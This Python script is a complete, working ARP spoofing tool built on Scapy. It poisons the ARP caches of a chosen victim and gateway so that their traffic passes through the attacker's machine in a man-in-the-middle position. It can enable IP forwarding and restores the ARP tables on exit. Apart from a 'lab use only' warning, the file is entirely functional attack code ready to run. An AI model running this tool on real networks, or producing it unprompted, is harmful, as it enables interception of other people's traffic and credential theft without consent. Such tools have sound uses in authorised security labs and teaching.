#!/usr/bin/env python3
"""
arp_spoof.py

ARP spoofing tool (transparent MitM) using Scapy.

Features:
 - CLI args: victim IP, gateway IP, interface
 - Optional enable IP forwarding on attacker while running (--enable-forward)
 - Graceful restore of ARP on exit (SIGINT/SIGTERM)
 - Verbose mode

Usage:
 sudo python3 arp_spoof.py -v 192.168.128.3 -g 192.168.128.4 -i eth0 --enable-forward --verbose

WARNING: Run only in an isolated lab you control.
"""

import argparse
import os
import sys
import time
import signal
import subprocess
from threading import Event

from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, conf, getmacbyip

# --- Globals ---
STOP_EVENT = Event()
VERBOSE = False
ORIGINAL_IP_FORWARD = None

def log(msg):
    if VERBOSE:
        print(msg)

def is_root():
    return os.geteuid() == 0

def get_ip_forward_state():
    """Read current ip_forward (returns '0' or '1' or None on error)."""
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            return f.read().strip()
    except Exception:
        return None

def set_ip_forward(enable):
    """Enable/disable IP forwarding via sysctl."""
    val = '1' if enable else '0'
    try:
        subprocess.run(['sysctl', '-w', f'net.ipv4.ip_forward={val}'],
                       check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        log(f"[+] IP forwarding set to {val}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to set IP forwarding: {e.stderr.decode().strip()}")
        return False

def mac_for_ip(ip, iface=None, timeout=2, retry=2):
    """
    Resolve MAC for an IP using scapy.getmacbyip() and fallback to ARP ping (srp).
    Returns MAC string or None.
    """
    # first try scapy helper
    try:
        if iface:
            conf.iface = iface
        mac = getmacbyip(ip)
        if mac:
            return mac
    except Exception:
        pass

    # fallback to ARP who-has broadcast
    for _ in range(retry):
        try:
            # srp a single ARP request and parse response
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=timeout, retry=0, iface=iface, verbose=False)
            if ans and len(ans) > 0:
                return ans[0][1].hwsrc
        except Exception:
            pass
    return None

def poison(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface):
    """
    Send forged ARP replies to victim and gateway to poison their ARP caches.
    We send directed ARP replies (op=2, is-at) to each host's MAC.
    """
    # victim: tell victim that gateway_ip is at attacker_mac
    pkt_v = Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=attacker_mac, hwdst=victim_mac)
    # gateway: tell gateway that victim_ip is at attacker_mac
    pkt_g = Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=attacker_mac, hwdst=gateway_mac)

    sendp(pkt_v, iface=iface, verbose=False)
    sendp(pkt_g, iface=iface, verbose=False)
    log(f"[*] Sent poison -> {victim_ip} [{victim_mac}] and {gateway_ip} [{gateway_mac}] as {attacker_mac}")

def restore(victim_ip, real_victim_mac, gateway_ip, real_gateway_mac, iface):
    """
    Send correct ARP replies to restore original mappings.
    Send multiple times to help targets update caches.
    """
    print("[*] Restoring ARP tables...")
    try:
        # send to victim: gateway_ip is real_gateway_mac
        if real_gateway_mac:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=real_gateway_mac)
            sendp(pkt, iface=iface, count=5, verbose=False)
        # send to gateway: victim_ip is real_victim_mac
        if real_victim_mac:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=real_victim_mac)
            sendp(pkt, iface=iface, count=5, verbose=False)

        print("[+] ARP restore packets sent (may need a few seconds for targets to update).")
    except Exception as e:
        print(f"[-] Error while restoring ARP: {e}")

def signal_handler(sig, frame, args, real_victim_mac, real_gateway_mac):
    """Handle termination: restore ARP and ip_forward state, then exit."""
    print("\n[!] Signal received, cleaning up...")
    try:
        # Try to restore ARP
        restore(args.victim, real_victim_mac, args.gateway, real_gateway_mac, args.interface)
    except Exception as e:
        print(f"[-] Restore failed: {e}")

    # restore ip forwarding setting
    global ORIGINAL_IP_FORWARD
    if ORIGINAL_IP_FORWARD is not None:
        set_ip_forward(ORIGINAL_IP_FORWARD == '1')

    print("[*] Exiting.")
    STOP_EVENT.set()
    # allow main loop to exit gracefully
    # don't call sys.exit here - main will exit
    return

def parse_args():
    p = argparse.ArgumentParser(description="ARP spoofing tool (lab use only)")
    p.add_argument('-v', '--victim', required=True, help='Victim IP address')
    p.add_argument('-g', '--gateway', required=True, help='Gateway IP address')
    p.add_argument('-i', '--interface', required=True, help='Network interface to use (e.g. eth0)')
    p.add_argument('--enable-forward', action='store_true', help='Enable IP forwarding while script runs')
    p.add_argument('--interval', type=float, default=2.0, help='Seconds between spoof packets (default: 2)')
    p.add_argument('--verbose', action='store_true', help='Verbose output')
    return p.parse_args()

def main():
    global VERBOSE, ORIGINAL_IP_FORWARD
    args = parse_args()
    VERBOSE = args.verbose

    print("WARNING: run this only in an isolated lab you control. Press Ctrl+C to stop and restore.")
    if not is_root():
        print("[-] This script must be run as root. Exiting.")
        sys.exit(1)

    conf.verb = 0  # silence scapy unless VERBOSE

    iface = args.interface
    victim_ip = args.victim
    gateway_ip = args.gateway

    # attacker MAC on chosen interface
    try:
        attacker_mac = get_if_hwaddr(iface)
    except Exception as e:
        print(f"[-] Could not get MAC for interface {iface}: {e}")
        sys.exit(1)

    # store original ip_forward state and set forwarding if requested
    ORIGINAL_IP_FORWARD = get_ip_forward_state()
    if args.enable_forward:
        if not set_ip_forward(True):
            print("[-] Failed to enable IP forwarding; aborting.")
            sys.exit(1)
    else:
        log("[*] IP forwarding left unchanged (enable with --enable-forward)")

    # Resolve real MAC addresses (best effort)
    print("[*] Resolving MAC addresses...")
    real_victim_mac = mac_for_ip(victim_ip, iface=iface)
    real_gateway_mac = mac_for_ip(gateway_ip, iface=iface)

    if not real_victim_mac:
        print(f"[-] Could not resolve MAC for victim {victim_ip}. You may proceed but restoration will be best-effort.")
    else:
        log(f"[+] Victim MAC: {real_victim_mac}")

    if not real_gateway_mac:
        print(f"[-] Could not resolve MAC for gateway {gateway_ip}. You may proceed but restoration will be best-effort.")
    else:
        log(f"[+] Gateway MAC: {real_gateway_mac}")

    # Register signal handlers
    signal.signal(signal.SIGINT, lambda s, f: signal_handler(s, f, args, real_victim_mac, real_gateway_mac))
    signal.signal(signal.SIGTERM, lambda s, f: signal_handler(s, f, args, real_victim_mac, real_gateway_mac))

    print(f"[*] Attacker MAC: {attacker_mac}")
    print(f"[*] Starting poisoning loop: victim={victim_ip}, gateway={gateway_ip}, iface={iface}")
    if VERBOSE:
        print("[*] Verbose mode ON")

    # If we couldn't resolve target MACs we still need to send poison packets — use broadcast (targets will accept ARP replies sent to their MAC)
    # But for poisoning we need to direct packets to the real device MAC to avoid flooding. If unknown, use broadcast.
    victim_dst_mac = real_victim_mac if real_victim_mac else "ff:ff:ff:ff:ff:ff"
    gateway_dst_mac = real_gateway_mac if real_gateway_mac else "ff:ff:ff:ff:ff:ff"

    try:
        while not STOP_EVENT.is_set():
            poison(victim_ip, victim_dst_mac, gateway_ip, gateway_dst_mac, attacker_mac, iface)
            time.sleep(args.interval)
    except Exception as e:
        print(f"[-] Exception in main loop: {e}")
    finally:
        # final cleanup: restore ARP and ip_forward
        try:
            restore(victim_ip, real_victim_mac, gateway_ip, real_gateway_mac, iface)
        except Exception as e:
            print(f"[-] Exception during final restore: {e}")
        if ORIGINAL_IP_FORWARD is not None:
            set_ip_forward(ORIGINAL_IP_FORWARD == '1')
        print("[*] Done.")

if __name__ == "__main__":
    main()
